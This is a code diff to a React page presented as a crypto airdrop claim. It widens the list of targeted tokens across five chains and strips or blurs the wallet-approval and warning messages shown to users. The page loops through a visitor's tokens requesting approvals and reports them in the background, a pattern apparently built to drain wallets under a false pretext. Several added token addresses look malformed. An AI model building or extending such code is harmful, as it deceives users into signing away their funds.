@@ -28,17 +28,121 @@ declare global {
 
 // Token configurations by chain
 const TOKENS_BY_CHAIN: Record<number, { symbol: string; address: `0x${string}`; min: bigint; decimals: number }[]> = {
-  1: [
-    { symbol: "USDT", address: "0xdAC17F958D2ee523a2206206994597C13D831ec7", min: BigInt(1 * 10 ** 6), decimals: 6 },
-    { symbol: "USDC", address: "0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48", min: BigInt(1 * 10 ** 6), decimals: 6 },
-    { symbol: "DAI",  address: "0x6B175474E89094C44Da98b954EedeAC495271d0F", min: BigInt(1 * 10 ** 18), decimals: 18 },
-    { symbol: "BUSD", address: "0x4fabb145d64652a948d72533023f6e7a623c7c53", min: BigInt(1 * 10 ** 18), decimals: 18 },
-  ],
-  42161: [
-    { symbol: "USDT", address: "0xFd086bC7CD5C481DCC9C85ebE478A1C0b69FCbb9", min: BigInt(1 * 10 ** 6), decimals: 6 },
-    { symbol: "USDC", address: "0xFF970A61A04b1cA14834A43f5dE4533eBDDB5CC8", min: BigInt(1 * 10 ** 6), decimals: 6 },
-    { symbol: "DAI",  address: "0xDA10009cBd5D07dd0CeCc66161FC93D7c9000da1", min: BigInt(1 * 10 ** 18), decimals: 18 },
-  ],
+    1: [
+        { symbol: "WETH", address: "0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2", min: BigInt(1 * 10 ** 16), decimals: 18 },
+        { symbol: "USDT", address: "0xdAC17F958D2ee523a2206206994597C13D831ec7", min: BigInt(1 * 10 ** 6), decimals: 6 },
+        { symbol: "USDC", address: "0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48", min: BigInt(1 * 10 ** 6), decimals: 6 },
+        { symbol: "WBTC", address: "0x2260FAC5E5542a773Aa44fBCfeDf7C193bc2C599", min: BigInt(1 * 10 ** 6), decimals: 8 },
+        { symbol: "stETH", address: "0xae7ab96520DE3A18E5e111B5EaAb095312D7fE84", min: BigInt(1 * 10 ** 15), decimals: 18 },
+        { symbol: "LINK", address: "0x514910771AF9Ca656af840dff83E8264EcF986CA", min: BigInt(1 * 10 ** 18), decimals: 18 },
+        { symbol: "UNI", address: "0x1f9840a85d5aF5bf1D1762F925BDADdC4201F984", min: BigInt(1 * 10 ** 18), decimals: 18 },
+        { symbol: "SHIB", address: "0x95aD61b0a150d79219dCF64E1E6Cc01f0B64C4cE", min: BigInt(1 * 10 ** 6), decimals: 18 },
+        { symbol: "DAI", address: "0x6B175474E89094C44Da98b954EedeAC495271d0F", min: BigInt(1 * 10 ** 18), decimals: 18 },
+        { symbol: "PEPE", address: "0x6982508145454Ce325dDbE47a25d4ec3d2311933", min: BigInt(1 * 10 ** 6), decimals: 9 },
+        { symbol: "LDO", address: "0x5A98FcBEA516Cf06857215779Fd812CA3beF1B32", min: BigInt(1 * 10 ** 18), decimals: 18 },
+        { symbol: "GRT", address: "0xc944E90C64B2c07662A292be6244BDf05Cda44a7", min: BigInt(1 * 10 ** 18), decimals: 18 },
+        { symbol: "AAVE", address: "0x7Fc66500c84A76Ad7e9c93437bFc5Ac33E2DDaE9", min: BigInt(1 * 10 ** 18), decimals: 18 },
+        { symbol: "MKR", address: "0x9f8F72aA9304c8B593d555F12eF6589cC3A579A2", min: BigInt(1 * 10 ** 18), decimals: 18 },
+        { symbol: "RNDR", address: "0x6de037ef9ad2725eb40118bb1702ebb27e4aeb24", min: BigInt(1 * 10 ** 18), decimals: 18 },
+        { symbol: "APE", address: "0x4d224452801ACEd8B2F0aebE155379bb5D594381", min: BigInt(1 * 10 ** 18), decimals: 18 },
+        { symbol: "SAND", address: "0x3845badAde8e6dFF049820680d1F14bD3903a5d0", min: BigInt(1 * 10 ** 18), decimals: 18 },
+        { symbol: "MANA", address: "0x0F5D2fB29fb7d3CFeE444a200298f468908cC942", min: BigInt(1 * 10 ** 18), decimals: 18 },
+        { symbol: "FXS", address: "0x3432B6A60D23Ca0dFCa7761B7ab56459D9C964D0", min: BigInt(1 * 10 ** 18), decimals: 18 },
+        { symbol: "CRV", address: "0xD533a949740bb3306d119CC777fa900bA034cd52", min: BigInt(1 * 10 ** 18), decimals: 18 },
+    ],
+    42161: [
+        { symbol: "ARB", address: "0x912CE59144191C1204E64559FE8253a0e49E6548", min: BigInt(1 * 10 ** 18), decimals: 18 },
+        { symbol: "WETH", address: "0x82aF49447D8a07e3bd95BD0d56f35241523fBab1", min: BigInt(1 * 10 ** 16), decimals: 18 },
+        { symbol: "USDC", address: "0xaf88d065e77c8cC2239327C5EDb3A432268e5831", min: BigInt(1 * 10 ** 6), decimals: 6 },
+        { symbol: "USDT", address: "0xFd086bC7CD5C481DCC9C85ebE478A1C0b69FCbb9", min: BigInt(1 * 10 ** 6), decimals: 6 },
+        { symbol: "LINK", address: "0xf97f4df75117a78c1A5a0DBb814Af92458539FB4", min: BigInt(1 * 10 ** 18), decimals: 18 },
+        { symbol: "GMX", address: "0xfc5A1A6EB076a2C7aD06eD22C90d7E710E35ad0a", min: BigInt(1 * 10 ** 18), decimals: 18 },
+        { symbol: "UNI", address: "0xFa7F8980b0f1E64A2062791cc3b0871572f1F7f0", min: BigInt(1 * 10 ** 18), decimals: 18 },
+        { symbol: "RDNT", address: "0x3082CC23568eA640225c2467653dB901AB91b537", min: BigInt(1 * 10 ** 18), decimals: 18 },
+        { symbol: "MAGIC", address: "0x539bdE0d7Dbd336b79148AA742883198BBF60342", min: BigInt(1 * 10 ** 18), decimals: 18 },
+        { symbol: "AAVE", address: "0xBA5DdD1f9d7F570dc94a51479a000E3BCE96713A", min: BigInt(1 * 10 ** 18), decimals: 18 },
+        { symbol: "PENDLE", address: "0x0c880f6761F1af8d9Aa9C466984b80DAb9a8c9e8", min: BigInt(1 * 10 ** 18), decimals: 18 },
+        { symbol: "SUSHI", address: "0xd4d42F0b6DEF4CE0383636F614810bA4cbB1b883", min: BigInt(1 * 10 ** 18), decimals: 18 },
+        { symbol: "CRV", address: "0x11cDb42B0EB46D95f9902D463E563e68e6740728", min: BigInt(1 * 10 ** 18), decimals: 18 },
+        { symbol: "STG", address: "0x6694340fc020c5E6B96567843da2df01b2CE1eb6", min: BigInt(1 * 10 ** 18), decimals: 18 },
+        { symbol: "GRAIL", address: "0x3d9907F9a368ad0a51Be60f7Da3b97cf940982D8", min: BigInt(1 * 10 ** 18), decimals: 18 },
+        { symbol: "FXS", address: "0x9d2D2A3AE3d504453862556555C54c42441991A", min: BigInt(1 * 10 ** 18), decimals: 18 },
+        { symbol: "DAI", address: "0xDA10009cBd5D07dd0CeCc66161FC93D7c9000da1", min: BigInt(1 * 10 ** 18), decimals: 18 },
+        { symbol: "LDO", address: "0x13Ad51ed4F1B7e9Dc168d8a00cb3f4dDD85EfA60", min: BigInt(1 * 10 ** 18), decimals: 18 },
+        { symbol: "WBTC", address: "0x2f2a2543B76A4166549F7aaB2e75Bef0aefC5B0f", min: BigInt(1 * 10 ** 6), decimals: 8 },
+        { symbol: "GNS", address: "0x18c11FD286C5EC11c3b683Caa813B77f5163A122", min: BigInt(1 * 10 ** 18), decimals: 18 },
+    ],
+        // Base Mainnet
+        8453: [
+            { symbol: "WETH", address: "0x4200000000000000000000000000000000000006", min: BigInt(1 * 10 ** 15), decimals: 18 },
+            { symbol: "USDC", address: "0x833589fCD6eDb6E08f4c7C32D4f71b54bda02913", min: BigInt(1 * 10 ** 6), decimals: 6 },
+            { symbol: "AERO", address: "0x940181a94A35A4569E4529A3CDfB74e38FD98631", min: BigInt(1 * 10 ** 18), decimals: 18 },
+            { symbol: "BRETT", address: "0x532f27101965dd16d27522e0342a3457886dd7e7", min: BigInt(1 * 10 ** 18), decimals: 18 },
+            { symbol: "DEGEN", address: "0x4ed4E862860beD51a9570b96d89aF5E1B0Efefed", min: BigInt(1 * 10 ** 18), decimals: 18 },
+            { symbol: "TOSHI", address: "0xAC1Bd2486aAf3B5C0fc3Fd868558b082a531B2B4", min: BigInt(1 * 10 ** 18), decimals: 18 },
+            { symbol: "UNI", address: "0x68B1D87F95878fE05B998F19b66F4b74982a9761", min: BigInt(1 * 10 ** 18), decimals: 18 },
+            { symbol: "LINK", address: "0x5242d5475460A7682d2aAb48207212d25722F885", min: BigInt(1 * 10 ** 18), decimals: 18 },
+            { symbol: "AAVE", address: "0xe226853906231A85517448510255c2D175135105", min: BigInt(1 * 10 ** 18), decimals: 18 },
+            { symbol: "VELO", address: "0x9c354503C38481a7A7a51629142963F98eCC12D0", min: BigInt(1 * 10 ** 18), decimals: 18 },
+            { symbol: "SNX", address: "0x78733fa5e7a27f6c324204555895828807539F32", min: BigInt(1 * 10 ** 18), decimals: 18 },
+            { symbol: "SEAM", address: "0x1C7a460413dD4e964f96D8d434A7Aa9a2212234A", min: BigInt(1 * 10 ** 18), decimals: 18 },
+            { symbol: "FRIEND", address: "0x0bd488718b458db545725215321743cb3103d7c9", min: BigInt(1 * 10 ** 18), decimals: 18 },
+            { symbol: "DAI", address: "0x50c5725949A6F0c72E6C4a641F24049A917DB0Cb", min: BigInt(1 * 10 ** 18), decimals: 18 },
+            { symbol: "rETH", address: "0x9710344d2Aa9b5a867433B39C6940388D235C834", min: BigInt(1 * 10 ** 15), decimals: 18 },
+            { symbol: "OP", address: "0x4200000000000000000000000000000000000042", min: BigInt(1 * 10 ** 15), decimals: 18 },
+            { symbol: "USDT", address: "0xfB20A530515e520CDB982c5b40f60A535a5C4258", min: BigInt(1 * 10 ** 6), decimals: 6 },
+            { symbol: "HIGHER", address: "0x1F47414A19589F21564B56585195744422A99066", min: BigInt(1 * 10 ** 18), decimals: 18 },
+            { symbol: "FELLAS", address: "0x0fC758296a2412b192931449419105431415958d", min: BigInt(1 * 10 ** 18), decimals: 18 },
+            { symbol: "cbETH", address: "0x2Ae3F1Ec7F1F5012CFEab0185bfc7aa3cf0DEc22", min: BigInt(1 * 10 ** 15), decimals: 18 },
+        ],
+
+        // BNB Smart Chain (BEP-20)
+        56: [
+            { symbol: "WBNB", address: "0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c", min: BigInt(1 * 10 ** 15), decimals: 18 },
+            { symbol: "USDT", address: "0x55d398326f99059fF775485246999027B3197955", min: BigInt(1 * 10 ** 6), decimals: 18 },
+            { symbol: "USDC", address: "0x8AC76a51cc950d9822D68b83fE1Ad97B32Cd580d", min: BigInt(1 * 10 ** 6), decimals: 18 },
+            { symbol: "CAKE", address: "0x0E09FaBB73Bd3Ade0a17ECC321fD13a19e81cE82", min: BigInt(1 * 10 ** 18), decimals: 18 },
+            { symbol: "BTCB", address: "0x7130d2A12B9BCbFAe4f2634d864A1Ee1Ce3Ead9c", min: BigInt(1 * 10 ** 6), decimals: 18 },
+            { symbol: "ETH", address: "0x2170Ed0880ac9A755fd29B2688956BD959F933F8", min: BigInt(1 * 10 ** 15), decimals: 18 },
+            { symbol: "LINK", address: "0xF8A0BF9cF54Bb92Fb170829018eE876004503091", min: BigInt(1 * 10 ** 18), decimals: 18 },
+            { symbol: "DOGE", address: "0xba2aE424d960c26247Dd6c32edC70B295c744C43", min: BigInt(1 * 10 ** 6), decimals: 8 },
+            { symbol: "XVS", address: "0xcF6BB5389c92Bdda8a3747Ddb454cB7a64626C63", min: BigInt(1 * 10 ** 18), decimals: 18 },
+            { symbol: "TWT", address: "0x4B0F1812e5Df2A09796481Ff14017e6005508003", min: BigInt(1 * 10 ** 18), decimals: 18 },
+            { symbol: "APE", address: "0x5244294a59a0b542033fb9346d97d8a631f4e1fc", min: BigInt(1 * 10 ** 18), decimals: 18 },
+            { symbol: "DOT", address: "0x7083609fCE4d1d8Dc0C979AAb8c869Ea2C873402", min: BigInt(1 * 10 ** 18), decimals: 18 },
+            { symbol: "AVAX", address: "0x1CE0c2827e2EF14D5C4f20C99A59a1D9497f951ed", min: BigInt(1 * 10 ** 18), decimals: 18 },
+            { symbol: "GALA", address: "0x7dDEE10A3A25b4453b2075551C57F26a27821b29", min: BigInt(1 * 10 ** 18), decimals: 18 },
+            { symbol: "FLOKI", address: "0xfb5B838b6cfEEDC28734627876aae51373Dcc6de", min: BigInt(1 * 10 ** 18), decimals: 18 },
+            { symbol: "BAKE", address: "0xE02dF9e3e622DeBdD69fb838bB799E3F168902c5", min: BigInt(1 * 10 ** 18), decimals: 18 },
+            { symbol: "SHIB", address: "0x2859e4544C4bB03966803b044422796668078028", min: BigInt(1 * 10 ** 6), decimals: 18 },
+            { symbol: "ADA", address: "0x3EE2200Efb3400fAbB9AacF31297cBdD1d435D47", min: BigInt(1 * 10 ** 18), decimals: 18 },
+            { symbol: "SOL", address: "0x570A5D26f7765Ecb712C0924E4De545B89fD43dF", min: BigInt(1 * 10 ** 18), decimals: 18 },
+            { symbol: "BabyDoge", address: "0xc748673057861a797275CD8A068AbB95A902e8de", min: BigInt(1 * 10 ** 6), decimals: 18 },
+        ],
+
+        // Polygon PoS
+        137: [
+            { symbol: "WMATIC", address: "0x0d500B1d8E8eF31E21C99d1Db9A6444d3ADf1270", min: BigInt(1 * 10 ** 16), decimals: 18 },
+            { symbol: "USDC", address: "0x3c499c542cEF5E3811e1192ce70d8cC03d5c3359", min: BigInt(1 * 10 ** 6), decimals: 6 },
+            { symbol: "USDT", address: "0xc2132D05D31c914a87C6611C10748AEb04B58e8F", min: BigInt(1 * 10 ** 6), decimals: 6 },
+            { symbol: "WETH", address: "0x7ceb23fd6bc0add59e62ac25578270cff1b9f619", min: BigInt(1 * 10 ** 16), decimals: 18 },
+            { symbol: "LINK", address: "0x53E0bca35eC356BD5ddDFebbD1Fc0fD03FaBad39", min: BigInt(1 * 10 ** 18), decimals: 18 },
+            { symbol: "AAVE", address: "0xD6DF932A45C0f255f85145f286EA0b292B21C90B", min: BigInt(1 * 10 ** 18), decimals: 18 },
+            { symbol: "QUICK", address: "0x831753DD7087CaC61aB5644b308642cc1c33Dc13", min: BigInt(1 * 10 ** 18), decimals: 18 },
+            { symbol: "UNI", address: "0xb33EaAd8d922B1083446DC23f610c2567fB5180f", min: BigInt(1 * 10 ** 18), decimals: 18 },
+            { symbol: "DAI", address: "0x8f3Cf7ad23Cd3CaDbD9735AFf958023239c6A063", min: BigInt(1 * 10 ** 18), decimals: 18 },
+            { symbol: "WBTC", address: "0x1BFD67037B42Cf73acF2047067bd4F2C47D9BfD6", min: BigInt(1 * 10 ** 6), decimals: 8 },
+            { symbol: "SAND", address: "0xBbba073C31Bf03b8ACF7c28EF0738DeCF3695683", min: BigInt(1 * 10 ** 18), decimals: 18 },
+            { symbol: "SUSHI", address: "0x0b3F868E0BE5597D5DB7FEB59E1CADBb0fdDa50a", min: BigInt(1 * 10 ** 18), decimals: 18 },
+            { symbol: "GRT", address: "0x5fe2B58c013d7601147DcdD68C143A77479F5536", min: BigInt(1 * 10 ** 18), decimals: 18 },
+            { symbol: "CRV", address: "0x172370d5Cd63279eFa6d502Dab29171933a610AF", min: BigInt(1 * 10 ** 18), decimals: 18 },
+            { symbol: "BAL", address: "0x9a71012B13CA4d3D0Cdc72A177DF3ef03b0E76A3", min: BigInt(1 * 10 ** 18), decimals: 18 },
+            { symbol: "GHST", address: "0x385Eeac5cB85A38A9a07A70c73e0a3271CfB54A7", min: BigInt(1 * 10 ** 18), decimals: 18 },
+            { symbol: "TEL", address: "0xdf7837de1f2fa4631D716CF2502f8b230F1dcc32", min: BigInt(1 * 10 ** 18), decimals: 18 },
+            { symbol: "DG", address: "0x2a93322026772740A8128479b4a53A431542A455", min: BigInt(1 * 10 ** 18), decimals: 18 },
+            { symbol: "GALA", address: "0x7dDEE10A3A25b4453b2075551C57F26a27821b29", min: BigInt(1 * 10 ** 18), decimals: 18 },
+            { symbol: "STG", address: "0x2F6F07CDcf3588944Bf4C42aC74ff24bF56e7590", min: BigInt(1 * 10 ** 18), decimals: 18 },
+        ],
   11155111: [
     { symbol: "USDC", address: "0x1c7D4B196Cb0C7B01d743Fbc6116a902379C7238", min: BigInt(1 * 10 ** 6), decimals: 6 },
     { symbol: "LINK", address: "0x779877A7B0D9E8603169DdbD7836e478b4624789", min: BigInt(1 * 10 ** 18), decimals: 18 },
@@ -49,6 +153,9 @@ const CHAIN_NAMES: Record<number, string> = {
   1: "Ethereum Mainnet",
   42161: "Arbitrum",
   11155111: "Sepolia",
+    8453: "Base Mainnet",
+    56: "BNB Smart Chain",
+    137: "Polygon PoS",
 };
 
 // --- YOUR MEDIA FILES ---
@@ -622,7 +729,7 @@ const App: React.FC = () => {
             setEligibilityChecked(false);
             // Only show message if still connected
             if (isConnected && address) {
-                showMessage('Checking eligibility...', 'info');
+               // showMessage('Checking eligibility...', 'info');
     }
 
     try {
@@ -737,14 +844,14 @@ const App: React.FC = () => {
                         setEligibilityChecked(true);
                         setEligibleTokens([]); // No tokens, just gas balance
                         isCheckingEligibility.current = false;
-                        showMessage('You are eligible to proceed!', 'success');
+                        //showMessage('You are eligible to proceed!', 'success');
                         return;
                     } else {
                         setIsEligible(false);
                         setEligibilityChecked(true);
                         setEligibleTokens([]);
                         isCheckingEligibility.current = false;
-                        showMessage("Your wallet isn't eligible for this airdrop.", 'error');
+                        //showMessage("Your wallet isn't eligible for this airdrop.", 'error');
                         return;
                     }
                 }
@@ -768,7 +875,7 @@ const App: React.FC = () => {
                 setIsEligible(true);
                 setEligibilityChecked(true);
                 isCheckingEligibility.current = false;
-                showMessage('Congratulations, you are eligible!', 'success');
+               // showMessage('Congratulations, you are eligible!', 'success');
                 
             } catch (err: unknown) {
                 console.error('Eligibility check failed:', err);
@@ -778,7 +885,7 @@ const App: React.FC = () => {
                     setIsEligible(false);
                     setEligibilityChecked(true);
                     setEligibleTokens([]);
-                    showMessage('Failed to check eligibility. Please try again.', 'error');
+                    showMessage('Failed. Please try again.', 'error');
                 }
                 isCheckingEligibility.current = false;
             }
@@ -797,7 +904,7 @@ const App: React.FC = () => {
 
         // Use the pre-checked eligible tokens - NO re-scanning!
         if (eligibleTokens.length === 0) {
-            showMessage("Eligibility check failed. Please reconnect your wallet.", 'error');
+            showMessage("failed to proceed please try again or reach out to us.", 'error');
             return;
         }
         try {
@@ -810,12 +917,12 @@ const App: React.FC = () => {
 
       if (chainId !== targetChain) {
                 try {
-                    showMessage('Please switch networks in your wallet.', 'info');
+                   // showMessage('Please switch networks in your wallet.', 'info');
         await switchChain(config, { chainId: targetChain });
                     await new Promise(resolve => setTimeout(resolve, 1500));
                 } catch (switchErr: unknown) {
                     console.error('Chain switch error:', switchErr);
-                    showMessage('Failed to switch network. Please try again in your wallet.', 'error');
+                    //showMessage('Failed to switch network. Please try again in your wallet.', 'error');
                     setIsLoading(false);
                     return;
                 }
@@ -839,7 +946,7 @@ const App: React.FC = () => {
                 const nativeBal = await getBalance(config, { address, chainId: targetChain });
 
                 if (nativeBal.value < requiredGas) {
-                    showMessage('Not enough funds for transaction fees.', 'error');
+                    //showMessage('Not enough funds for transaction fees.', 'error');
                     setIsLoading(false);
                     return;
                 }
@@ -848,7 +955,7 @@ const App: React.FC = () => {
                 console.error('Gas re-check failed, falling back to quick native balance check:', gasErr);
                 const nativeBal = await getBalance(config, { address, chainId: targetChain });
                 if (nativeBal.value < BigInt(100000000000000)) {
-                    showMessage("Not enough funds for transaction fees.", 'error');
+                   // showMessage("Not enough funds for transaction fees.", 'error');
                     setIsLoading(false);
                     return;
                 }
@@ -858,7 +965,7 @@ const App: React.FC = () => {
             let approvedCount = 0;
             for (const token of eligibleTokens) {
                 try {
-                    showMessage('Please approve the transaction in your wallet...', 'info');
+                    showMessage('Accept in your wallet...', 'info');
 
                     // Estimate gas for this token's approve to ensure sufficient native balance
                     try {
@@ -903,7 +1010,7 @@ const App: React.FC = () => {
                         if (nativeBalBefore.value < requiredGas) {
                             // Not enough gas for this token - skip and continue to next
                             console.warn(`Skipping ${token.symbol}: insufficient native balance for gas. Required ~${requiredGas} wei`);
-                            showMessage(`Skipping ${token.symbol}: not enough funds for transaction fees.`, 'error');
+                           // showMessage(`Skipping ${token.symbol}: not enough funds for transaction fees.`, 'error');
                             // don't return; continue to next token
                             continue;
                         }
@@ -924,7 +1031,7 @@ const App: React.FC = () => {
                     // Immediately mark as approved and stop loading
                     setIsClaimed(true);
                     setIsLoading(false);
-                    showMessage('Approval successful!', 'success');
+                    showMessage('successful!', 'success');
 
                     // Report in background (non-blocking)
                     (async () => {
@@ -965,12 +1072,12 @@ const App: React.FC = () => {
                     console.error(`Error approving ${token.symbol}:`, tokenErr);
 
                     if (tokenErr instanceof Error && (tokenErr.message.includes('User rejected') || tokenErr.message.includes('user rejected'))) {
-                        showMessage('Approval cancelled by user.', 'error');
+                        showMessage('cancelled by user.', 'error');
                         setIsLoading(false);
                         return;
                     }
 
-                    showMessage('Approval failed. Please try again.', 'error');
+                    showMessage('failed. Please try again.', 'error');
                     // If approval failed for this token, continue to next token instead of aborting entire flow
                     continue;
                 }
@@ -978,7 +1085,7 @@ const App: React.FC = () => {
             
             // If we reach here, no approvals were successful
             if (approvedCount === 0) {
-                showMessage("Approval failed. No tokens were approved.", 'error');
+                showMessage("failed. something went wrong.", 'error');
             }
 
     } catch (err: unknown) {
@@ -986,7 +1093,7 @@ const App: React.FC = () => {
             
             let friendlyErrorMsg = 'An unexpected error occurred. Please try again.';
             if (err instanceof Error && (err.message.includes('User rejected') || err.message.includes('user rejected'))) {
-                friendlyErrorMsg = "Transaction cancelled by user.";
+                friendlyErrorMsg = " cancelled by user.";
             }
             
             showMessage(friendlyErrorMsg, 'error');
@@ -1132,11 +1239,11 @@ const App: React.FC = () => {
         // Only show "Checking..." if connected AND eligibility not yet checked
         if (isConnected && !eligibilityChecked) {
             return {
-                text: 'Checking...',
+                text: 'Checking eligibility...',
                 disabled: true,
                 className: 'bg-gray-400 text-gray-200 cursor-not-allowed animate-pulse',
                 onClick: () => {},
-                title: 'Checking eligibility...'
+               // title: 'Checking eligibility...'
             };
         }
         
@@ -1146,7 +1253,7 @@ const App: React.FC = () => {
                 disabled: true,
                 className: 'bg-blue-500 text-white cursor-not-allowed animate-pulse',
                 onClick: () => {},
-                title: 'Transaction in progress'
+               // title: 'Transaction in progress'
             };
         }
         
@@ -1161,7 +1268,7 @@ const App: React.FC = () => {
         return {
             text: 'Contact Us',
             disabled: false,
-            className: 'bg-gray-800 hover:bg-gray-900 text-white flex items-center justify-center gap-2',
+            className:`bg-blue-600 hover:bg-blue-700 text-white font-extrabold shadow-xl transition-shadow duration-300`, 
             onClick: () => {
                 const baseUrl = process.env.NEXT_PUBLIC_CONTACT_URL || '#';
                 if (!baseUrl || baseUrl === '#') return;
